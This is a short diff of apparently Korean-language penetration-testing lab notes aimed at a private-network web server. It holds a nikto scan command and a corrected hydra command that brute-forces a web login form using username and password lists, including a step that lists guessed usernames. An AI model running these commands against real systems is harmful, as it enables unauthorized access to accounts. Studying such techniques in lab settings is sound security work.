@@ -14,4 +14,6 @@
 `nikto -h http://192.168.56.112:8080/`
 
 # \[브루트 포스 공격]
-`hydra http://192.168.56.112:8080/ http-form-post "username=^USER^&pwd=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`
+- `weakuser.txt` 파일 생성
+- guest, venus, magellan 추가 저장
+`hydra 192.168.56.112:8080 http-form-post "/:username=^USER^&pwd=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`
